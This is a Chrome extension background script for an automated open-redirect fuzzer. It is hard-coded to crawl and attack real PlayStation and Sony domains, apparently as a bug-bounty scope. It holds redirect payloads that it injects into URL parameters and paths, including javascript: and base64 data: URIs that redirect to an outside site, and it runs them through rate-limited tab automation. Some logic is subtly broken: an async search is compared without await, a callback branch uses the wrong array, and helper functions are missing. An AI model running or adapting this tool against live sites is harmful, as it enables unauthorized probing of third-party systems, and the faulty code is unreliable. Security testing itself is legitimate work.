/**
 * Background script for fuzzer-open-redirect.
 */

import constants from "./constants.mjs"

let bufferLengthURLs = 80;
let crawlerScripts = [];
let delayForceWakeTabsThread = 1000;
let delayPendingRetryURLsThread = 20000;
let delayRangeHttpRateLimit = [4000, 6000];
let delayRequestThread = 10;
let delayTabLimitCheck = 1000;
let delayTabRemovalThread = 20000;
let delayThreadPause = 1000;
let delayURLIndexing = 10;
let isRequestThreadPaused = false;
let limitOfTabs = 6;
let removeHashFromInjectableParameterURLs = true;
let removeHashFromInjectablePathURLs = true;
let removeHashFromInjectableRedirectParameterURLs = true;
let removeHashFromScannableURLs = false;
let retryAttempts = 6;
let scanOutOfScopeOrigins = false;
let scope = [
	"*://*.playstation.net",
	"*://*.sonyentertainmentnetwork.com",
	"*://*.api.playstation.com",
	"*://my.playstation.com",
	"*://store.playstation.com",
	"*://social.playstation.com",
	"*://transact.playstation.com",
	"*://wallets.playstation.com",
	"*://direct.playstation.com",
	"*://api.direct.playstation.com",
];
let statusCodesFail = ["4*", "5*"];
let threadCount = 2;
let timeoutCallback = 40000;
let timeoutRequests = 40000;
let urlPriorities = [
	2, /* injected redirect parameter */
	1, /* injected path */
	0, /* injected parameter */
	3, /* scan */
];

const consoleCSS = "background-color:rgb(80,255,0);text-shadow:0 1px 1px rgba(0,0,0,.3);color:black";
const redirectURLs = [
	"https://runescape.com",
	"http://runescape.com",
	"//runescape.com",
	"data:text/html,<script>location='https://runescape.com'</script>",
	"data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cHM6Ly9ydW5lc2NhcGUuY29tJzwvc2NyaXB0Pg",
	"javascript:location='https://runescape.com'",
	"javascript:location='//runescape.com'",
	"javascript:location=\"https://runescape.com\"",
	"javascript:location=\"//runescape.com\"",
	"javascript:location=`https://runescape.com`",
	"javascript:location=`//runescape.com`",
];

let callbackURLOpenRedirectTimestamps = "http://0.0.0.0:4242";
let callbackURLRequestTimestamps = "http://0.0.0.0:4243";
let parsedCallbackURLOpenRedirectTimestamps = ["","","","","",""];
let parsedCallbackURLRequestTimestamps = ["","","","","",""];
let tabAnchorId;
let tabIds = [];
let tabRemovalBuffer = [];
let windowId;
let worker;

/**
 * Buffered and throttled method that returns the index of a given target object in a given
 * array.
 */
const bufferedIndexOf = async (arr, target, bufferLength, delayThrottle) => {
	const amountOfChunks = Math.ceil(arr.length / bufferLength);
	for (let a = 0; a < amountOfChunks; a++) {
		for (
			let b = a * bufferLength;
			   b < arr.length
			&& b < (a * bufferLength) + bufferLength - 1;
			b++
		) {
			if (arr[b] === target) {
				return b;
			}
		}
		await sleep(delayThrottle);
	}
	return -1;
};

/**
 * Chunks a given array to a given length.
 */
const chunkArrayToAmountOfChunks = (array, amountOfChunks) => {
	const chunkSize = Math.ceil(array.length / amountOfChunks);
	const chunks = new Array(amountOfChunks);
	for (let a = 0; a < amountOfChunks; a++) {
		chunks[a] = array.slice(chunkSize * a, (chunkSize * a) + chunkSize);
	}
	return chunks;
};

/**
 * Chunks a given array based on a given length of each chunk.
 */
const chunkArrayWithChunkSize = (array, chunkSize) => {
	const amountOfChunks = Math.ceil(array.length / chunkSize);
	const chunks = new Array(amountOfChunks);
	for (let a = 0; a < amountOfChunks; a++) {
		chunks[a] = array.slice(chunkSize * a, (chunkSize * a) + chunkSize);
	}
	return chunks;
};

/**
 * Returns an integer value between a minimum and maximum range of
 * milliseconds.
 */
const getIntFromRange = (min, max) => {
	return parseInt(min + (Math.random() * (max - min)));
};

/**
 * Returns the current timestamp.
 */
const getTimestamp = () => {
	const date = new Date();
	return date.toLocaleDateString() + " " + date.toLocaleTimeString();
};

/**
 * Returns true if a given status code string matches the specified
 * fail status code specifiers.
 */
const isFailStatusCode = statusCodeString => {
	for (let a = 0; a < statusCodesFail.length; a++) {
		const selector = new RegExp("^" + statusCodesFail[a].replace(
			constants.regexpSelectorWildcardStatusCode,
			"[0-9]+") + "$");
		if (selector.test(statusCodeString)) {
			return true;
		}
	}
	return false;
};

/**
 * (example input: "http://www.in.scope.domain.com")
 * (example output given "\*://\*.in.scope.*" is in the scope: true)
 */
const isInScopeOrigin = origin => {
	for (let a = 0; a < scope.length; a++) {
		const regexpInScopeOrigin = new RegExp(
			"^" + scope[a]
				.replace(constants.regexpSelectorEscapeChars, "[$1]")
				.replace(
					constants.regexpSelectorURLSchemeEscaped,
					"$1[a-z0-9.+-]+$2:")
				.replace(
					constants.regexpSelectorWildcardSubdomainEscaped,
					"(?:(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?[.])+)"),
			"ig");
		if (regexpInScopeOrigin.test(origin)) return true;
	}
	return false;
}

/**
 * Returns a promise that resolves the local storage object.
 */
const loadStorage = async () => {
	return new Promise(res => {
		chrome.storage.local.get(storage => {
			if (!storage.injectableParameterURLs) {
				storage.injectableParameterURLs =
					localStorage.injectableParameterURLs;
			}
			if (!storage.injectableParameterURLsBuffer) {
				storage.injectableParameterURLsBuffer =
					localStorage.injectableParameterURLsBuffer;
			}
			if (!storage.injectedParameterURLs) {
				storage.injectedParameterURLs =
					localStorage.injectedParameterURLs;
			}
			if (!storage.injectedParameterURLsRequestQueue) {
				storage.injectedParameterURLsRequestQueue =
					localStorage.injectedParameterURLsRequestQueue;
			}
			if (!storage.injectablePathURLs) {
				storage.injectablePathURLs =
					localStorage.injectablePathURLs;
			}
			if (!storage.injectablePathURLsBuffer) {
				storage.injectablePathURLsBuffer =
					localStorage.injectablePathURLsBuffer;
			}
			if (!storage.injectedPathURLs) {
				storage.injectedPathURLs =
					localStorage.injectedPathURLs;
			}
			if (!storage.injectedPathURLsRequestQueue) {
				storage.injectedPathURLsRequestQueue =
					localStorage.injectedPathURLsRequestQueue;
			}
			if (!storage.injectableRedirectParameterURLs) {
				storage.injectableRedirectParameterURLs =
					localStorage.injectableRedirectParameterURLs;
			}
			if (!storage.injectableRedirectParameterURLsBuffer) {
				storage.injectableRedirectParameterURLsBuffer =
					localStorage.injectableRedirectParameterURLsBuffer;
			}
			if (!storage.injectedRedirectParameterURLs) {
				storage.injectedRedirectParameterURLs =
					localStorage.injectedRedirectParameterURLs;
			}
			if (!storage.injectedRedirectParameterURLsRequestQueue) {
				storage.injectedRedirectParameterURLsRequestQueue =
					localStorage.injectedRedirectParameterURLsRequestQueue;
			}
			if (!storage.pendingRetryCallbackURLs) {
				storage.pendingRetryCallbackURLs =
					localStorage.pendingRetryCallbackURLs;
			}
			if (!storage.pendingRetryURLs) {
				storage.pendingRetryURLs =
					localStorage.pendingRetryURLs;
			}
			if (!storage.requestedURLs) {
				storage.requestedURLs =
					localStorage.requestedURLs;
			}
			if (!storage.scannableURLs) {
				storage.scannableURLs =
					localStorage.scannableURLs;
			}
			if (!storage.scannableURLsBuffer) {
				storage.scannableURLsBuffer =
					localStorage.scannableURLsBuffer;
			}
			if (!storage.scannableURLsRequestQueue) {
				storage.scannableURLsRequestQueue =
					localStorage.scannableURLsRequestQueue;
			}
			res(storage);
		});
	});
};

/**
 * Opens a given URL in a new scanner tab.
 */
const openURLInNewTab = async url => {
	return new Promise(async (res, err) => {
		chrome.windows.get(windowId, w => {
			if (!w) {
				pauseThread("request");
				return err();
			}
			chrome.tabs.create({
				url: url,
				windowId: windowId,
			}, async tab => {
				tabIds.push(tab.id);
				// execute crawlerScripts
				if (
					bufferedIndexOf(
						localStorage.requestedURLs,
						url,
						bufferLengthURLs,
						delayURLIndexing) === -1
				) {
					localStorage.requestedURLs.push(url);
					await writeStorage();
				}
				res(tab);
			});
		});
	});
};

/**
 * Opens new windows for fuzzing and scanning.
 */
const openWindow = async () => {
	return new Promise(res => {
		chrome.windows.create({
			url: "data:text/html,<title>about:black</title><body bgcolor=black>",
		}, w => {
			chrome.tabs.query({}, tabs => tabs.forEach(tab => {
				if (tab.windowId === w.id) tabAnchorId = tab.id;
			}));
			windowId = w.id
			res();
		});
	});
};

/**
 * Pauses a thread with a given name.
 * @param {string} threadName - Choices: [request]
 * @returns {boolean} success - Returns true if the thread exists, false otherwise.
 */
const pauseThread = threadName => {
	switch (threadName) {
		case "request":
			isRequestThreadPaused = true;
			console.log("Request thread paused.")
			return true;
		default:
			return false;
	}
};

/**
 * Register message listener.
 */
const registerMessageListeners = () => {
	chrome.runtime.onMessage.addListener(async (message, sender) => {
		if (message.injectableParameterURLs) {
			const injectableParameterURLs = [];
			const injectableRedirectParameterURLs = [];
			message.injectableParameterURLs.forEach(url => {
				const parsedURL = parseURL(url);
				let match, isRedirect;
				while (match = constants.regexpSelectorURLParameterValue.exec(parsedURL[4])) {
					if (constants.regexpSelectorURLRedirectParameter.test(match[0])) {
						if (removeHashFromInjectableRedirectParameterURLs) {
							url = url.replace(constants.regexpSelectorURLHashRemoval, "");
						}
						injectableRedirectParameterURLs.push(url);
						localStorage.injectableRedirectParameterURLsBuffer.push(url);
						isRedirect = true;
						break;
					}
				}
				if (!isRedirect) {
					if (removeHashFromInjectableParameterURLs) {
						url = url.replace(constants.regexpSelectorURLHashRemoval, "");
					}
					injectableParameterURLs.push(url);
					localStorage.injectableParameterURLsBuffer.push(url);
				}
			});
			worker.postMessage({
				injectableParameterURLs: injectableParameterURLs,
				injectableRedirectParameterURLs: injectableRedirectParameterURLs,
			});
		}
		if (message.injectablePathURLs) {
			const injectablePathURLs = [];
			message.injectablePathURLs.forEach(url => {
				if (removeHashFromInjectablePathURLs) {
					url = url.replace(constants.regexpSelectorURLHashRemoval, "");
				}
				injectablePathURLs.push(url);
				localStorage.injectablePathURLsBuffer.push(url);
			});
			worker.postMessage({
				injectablePathURLs: injectablePathURLs,
			});
		}
		if (message.scannableURLs) {
			const scannableURLs = [];
			message.scannableURLs.forEach(url => {
				if (removeHashFromScannableURLs) {
					url = url.replace(constants.regexpSelectorURLHashRemoval, "");
				}
				scannableURLs.push(url);
				localStorage.scannableURLsBuffer.push(url);
			});
			worker.postMessage({
				scannableURLs: scannableURLs,
			});
		}
		if (message.timestamp) {
			console.log("Open redirect found at ", message.timestamp);
			sendCallback(message.timestamp, "", "OPEN_REDIRECT_CALLBACK");
		}
		if (message.message) {
			if (message.message === "FRAME_READYSTATE_COMPLETE") {
				removeTab(sender.tab.id);
				tabIds = tabIds.filter(tab => {
					return tab.id !== sender.tab.id;
				});
			}
		}
	});
	worker.onmessage = async message => {
// if (message.data.debug) {
	console.log(message.data)
// }
		if (message.data.appendage) {
			if (message.data.appendage.injectableParameterURLs) {
				localStorage.injectableParameterURLs = localStorage
					.injectableParameterURLs.concat(
						message.data.appendage.injectableParameterURLs);
			}
			if (message.data.appendage.injectableRedirectParameterURLs) {
				localStorage.injectableRedirectParameterURLs = localStorage
					.injectableRedirectParameterURLs.concat(
						message.data.appendage.injectableRedirectParameterURLs);
			}
			if (message.data.appendage.injectablePathURLs) {
				localStorage.injectablePathURLs = localStorage
					.injectablePathURLs.concat(
						message.data.appendage.injectablePathURLs);
			}
			if (message.data.appendage.injectedParameterURLsRequestQueue) {
				localStorage.injectedParameterURLs = localStorage
					.injectedParameterURLs.concat(
						message.data.appendage.injectedParameterURLsRequestQueue);
				localStorage.injectedParameterURLsRequestQueue = localStorage
					.injectedParameterURLsRequestQueue.concat(
						message.data.appendage.injectedParameterURLsRequestQueue);
			}
			if (message.data.appendage.injectedPathURLsRequestQueue) {
				localStorage.injectedPathURLs = localStorage
					.injectedPathURLs.concat(message.data.appendage.injectedPathURLsRequestQueue);
				localStorage.injectedPathURLsRequestQueue = localStorage
					.injectedPathURLsRequestQueue.concat(
						message.data.appendage.injectedPathURLsRequestQueue);
			}
			if (message.data.appendage.injectedRedirectParameterURLsRequestQueue) {
				localStorage.injectedRedirectParameterURLs = localStorage
					.injectedRedirectParameterURLs.concat(
						message.data.appendage.injectedRedirectParameterURLsRequestQueue);
				localStorage.injectedRedirectParameterURLsRequestQueue = localStorage
					.injectedRedirectParameterURLsRequestQueue.concat(
						message.data.appendage.injectedRedirectParameterURLsRequestQueue);
			}
			if (message.data.appendage.scannableURLsRequestQueue) {
				localStorage.scannableURLs = localStorage
					.scannableURLs.concat(
						message.data.appendage.scannableURLsRequestQueue);
				localStorage.scannableURLsRequestQueue = localStorage
					.scannableURLsRequestQueue.concat(
						message.data.appendage.scannableURLsRequestQueue);
			}
			await writeStorage();
		}
		if (message.data.shift) {
			switch (message.data.shift) {
				case "injectableParameterURLsBuffer":
					localStorage.injectableParameterURLsBuffer.shift();
					break;
				case "injectablePathURLsBuffer":
					localStorage.injectablePathURLsBuffer.shift();
					break;
				case "injectableRedirectParameterURLsBuffer":
					localStorage.injectableRedirectParameterURLsBuffer.shift();
					break;
				case "scannableURLsBuffer":
					localStorage.scannableURLsBuffer.shift();
					break;
				default:
					console.error("unknown array to shift: " + message.data.shift);
			}
		}
	};
};

/**
 * Registers webRequest listeners.
 */
const registerWebRequestListeners = () => {
	/* Record offline error responses from main frames with no content scripts and remove their tabs. */
	chrome.webRequest.onErrorOccurred.addListener(
		details => {
			if (details.type === "main_frame") {
				chrome.tabs.get(details.tabId, tab => {
					if (!chrome.runtime.lastError && tab && tab.windowId === windowId) {
						removeTab(details.tabId);
					}
				});
				if (
					bufferedIndexOf(
						localStorage.pendingRetryURLs,
						details.url,
						bufferLengthURLs,
						delayURLIndexing) === -1
				) {
					localStorage.pendingRetryURLs.push(details.url);
				}
			}
		},
		{"urls": ["<all_urls>"]},
		[]);
	/* Record responses from main frames that match a specified fail status code. */
	chrome.webRequest.onHeadersReceived.addListener(
		details => {
			if (details.type === "main_frame") {
				if (isFailStatusCode(details.statusCode.toString())) {
					if (
						bufferedIndexOf(
							localStorage.pendingRetryURLs,
							details.url,
							bufferLengthURLs,
							delayURLIndexing) === -1
					) {
						localStorage.pendingRetryURLs.push(details.url);
					}
				}
			}
		},
		{"urls": ["<all_urls>"]},
		[]);
};

/**
 * Returns a promise to remove a tab with the specified ID.
 */
const removeTab = async id => {
	return new Promise(res => {
		chrome.tabs.get(id, tab => {
			if (
				   !chrome.runtime.lastError
				&& tab
				&& tab.windowId === windowId
			) {
				chrome.tabs.remove(id)
				res();
			}
		});
	});
};

/**
 * Sends a callback at a given timestamp for a given type.
 * (example input: ("03/12/2020 01:06:05", "...", "OPEN_REDIRECT_CALLBACK"))
 * (example input: ("03/12/2020 01:06:05", "...", "REQUEST_CALLBACK"))
 */
const sendCallback = async (timestamp, url, callbackType) => {
	return new Promise((res, err) => {
		let callbackURL = "";
		switch (callbackType) {
			case "OPEN_REDIRECT_CALLBACK":
				if (parsedCallbackURLOpenRedirectTimestamps[4] !== "") {
					callbackURL = parsedCallbackURLOpenRedirectTimestamps.slice(0, 5).join("") +
						"&timestamp=" + encodeURIComponent(timestamp) +
						"&url=" + encodeURIComponent(url) +
						parsedCallbackURLOpenRedirectTimestamps[5];
				} else {
					callbackURL = parsedCallbackURLOpenRedirectTimestamps.slice(0, 4).join("") +
						"?timestamp=" + encodeURIComponent(timestamp) +
						"&url=" + encodeURIComponent(url) +
						parsedCallbackURLOpenRedirectTimestamps[5];
				}
				break;
			case "REQUEST_CALLBACK":
				if (parsedCallbackURLRequestTimestamps[4] !== "") {
					callbackURL = parsedCallbackURLRequestTimestamps.slice(0, 5).join("") +
						"&timestamp=" + encodeURIComponent(timestamp) +
						"&url=" + encodeURIComponent(url) +
						parsedCallbackURLRequestTimestamps[5];
				} else {
					callbackURL = parsedCallbackURLRequestTimestamps.slice(0, 4).join("") +
						"?timestamp=" + encodeURIComponent(timestamp) +
						"&url=" + encodeURIComponent(url) +
						parsedCallbackURLOpenRedirectTimestamps[5];
				}
				break;
		}
		if (callbackURL.length !== 0) {
			fetch(callbackURL).then(_res => {
				if (!_res.ok) {
					if (!pendingRetryCallbackURLs[callbackURL]) {
						pendingRetryCallbackURLs[callbackURL] = {attempts: 0};
					}
				}
				res();
			}).catch(e => {
				err(e);
			});
		} else {
			err("Unable to create callback URL, " + "\n" +
				"timestamp: " + timestamp + "\n" +
				"callback type: " + callbackType + "\n" +
				"callback URLs: " + callbackURLRequestTimestamps +
					", " + callbackURLOpenRedirectTimestamps);
		}
	});
};

/**
 * Sleeps an awaited promise value for the given amount of
 * milliseconds.
 */
const sleep = ms => {
	return new Promise(res => {
		setTimeout(res, ms);
	});
};

/**
 * Force-wakes all tabs indefinitely.
 */
const startForceWakeTabsThread = async () => {
	while (true) {
		if (tabIds.length === 0) {
			await sleep(delayForceWakeTabsThread);
		}
		for (let a = 0; a < tabIds.length; a++) {
			chrome.tabs.get(tabIds[a], tab => {
				if (!chrome.runtime.lastError && tab) {
					chrome.tabs.update(tab.id, {
						active: true,
						selected: true,
					}, () => {});
				} else {
					tabIds = tabIds.filter(id => {
						return id !== tabIds[a];
					});
				}
			});
			await sleep(delayForceWakeTabsThread);
		}
	}
};

/**
 * Tries to request pending URLs that timed out.
 */
const startPendingRetryURLsThread = async () => {
//  while (true) {
//    localStorage.pendingRetryURLs.forEach(url => {
//      if (
//            parseURL(url).slice(0, 2)
//        === parseURL(callbackURLOpenRedirectTimestamps).slice(0, 2)
//      ) {
//        openURLInNewTab(url).then(() => {
//          localStorage.pendingRetryURLs = localStorage.pendingRetryURLs.filter(_url => {
//            return url !== _url;
//          });
//        });
//      }
//    });
//    await sleep(delayPendingRetryURLsThread);
//  }
};

/**
 * Starts requesting an indefinite amount of queued URLs.
 */
const startRequestThread = async () => {
	for (let a = 0; a < threadCount; a++) {
		(async () => {
			while (true) {
				while (isRequestThreadPaused) await sleep(delayThreadPause);
				while (tabIds.length >= limitOfTabs) await sleep(delayTabLimitCheck);
				while (
					   localStorage.injectedParameterURLsRequestQueue.length === 0
					&& localStorage.injectedPathURLsRequestQueue.length === 0
					&& localStorage.injectedRedirectParameterURLsRequestQueue.length === 0
					&& localStorage.scannableURLsRequestQueue.length === 0
				) await sleep(1000);
				let URL = "";
				while (!URL) {
					for (let b = 0; b < urlPriorities.length; b++) {
						if (URL.length !== 0) {
							break;
						}
						switch (urlPriorities[b]) {
							case 0:  /* injected parameter */
								if (localStorage.injectedParameterURLsRequestQueue.length !== 0) {
									URL = localStorage.injectedParameterURLsRequestQueue[0];
									localStorage.injectedParameterURLsRequestQueue.shift();
								}
								break;
							case 1:  /* injected path */
								if (localStorage.injectedPathURLsRequestQueue.length !== 0) {
									URL = localStorage.injectedPathURLsRequestQueue[0];
									localStorage.injectedPathURLsRequestQueue.shift();
								}
								break;
							case 2:  /* injected redirect parameter */
								if (localStorage.injectedRedirectParameterURLsRequestQueue.length !== 0) {
									URL = localStorage.injectedRedirectParameterURLsRequestQueue[0];
									localStorage.injectedRedirectParameterURLsRequestQueue.shift();
								}
								break;
							case 3:  /* scan */
								if (localStorage.scannableURLsRequestQueue.length !== 0) {
									URL = localStorage.scannableURLsRequestQueue[0];
									localStorage.scannableURLsRequestQueue.shift();
								}
								break;
						}
					}
					await sleep(delayRequestThread);
				}
				if (URL.length !== 0) {
					if (URL.startsWith("//")) URL = `http:${URL}`;
					const parsedURL = parseURL(URL);
					if (
						   scanOutOfScopeOrigins
						|| isInScopeOrigin(parsedURL.slice(0, 2).join(""))
					) {
						sendCallback(getTimestamp(), URL, "REQUEST_CALLBACK");
						openURLInNewTab(URL);
						await sleep(getIntFromRange(
							delayRangeHttpRateLimit[0],
							delayRangeHttpRateLimit[1]));
					} else {
						await sleep(delayRequestThread);
					}
					await writeStorage();
				}
			}
		})();
	}
};

/**
 * Starts looking for seemingly idle tabs and removes them.
 */
const startTabRemovalThread = async () => {
	while (true) {
		chrome.tabs.query({}, tabs => {
			tabs.forEach(tab => {
				if (
					   tab.windowId === windowId
					&& tab.id !== tabAnchorId
				) {
					if (tabRemovalBuffer.indexOf(tab.id) === -1) {
						tabRemovalBuffer.push(tab.id);
					} else {
						removeTab(tab.id);
						tabRemovalBuffer = tabRemovalBuffer.filter(id => {
							return id !== tab.id;
						});
					}
				}
			});
		});
		await sleep(delayTabRemovalThread);
	}
};

/**
 * Trims all leading and trailing whitespaces off a given string.
 * (example input: " https://example.com/  \n")
 * (example output: "https://example.com/")
 */
const trimLeadingAndTrailingWhitespaces = str => {
	return str.replace(constants.regexpSelectorLeadingAndTrailingWhitespace, "$1");
};

/**
 * Writes the localStorage object as the extension's local storage
 * object.
 */
const writeStorage = () => {
	return new Promise(resolve => {
		chrome.storage.local.set(localStorage, resolve);
	});
};

/**
 * Init background script.
 */
(() => {
	parseCallbackURLs().then(async () => {
		localStorage = await loadStorage();
		worker = new Worker(chrome.runtime.getURL("/assets/js/worker.js"));
		registerMessageListeners();
		worker.postMessage({
			localStorage: localStorage,
			threadCount: threadCount,
		});
		registerWebRequestListeners();
		await openWindow();
		startForceWakeTabsThread();
		startPendingRetryURLsThread();
		startRequestThread();
		startTabRemovalThread();

		openURLInNewTab("https://store.playstation.com/");
	});
})();
